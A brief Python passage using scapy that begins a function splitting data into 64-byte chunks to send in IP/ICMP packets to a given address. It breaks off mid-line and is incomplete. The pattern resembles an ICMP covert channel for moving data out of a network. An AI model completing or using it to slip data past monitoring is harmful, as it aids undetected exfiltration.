import scapy
import sys
from scapy.all import IP, ICMP, send

def sendy(ip_dest, data, fragment_size=64):
    fragments = [data[i:i+fragment_size] for i in range(0, len(data), fragment_size)]
    
    for i, fragment in enumerate(fragments):
        packet = IP(dst=)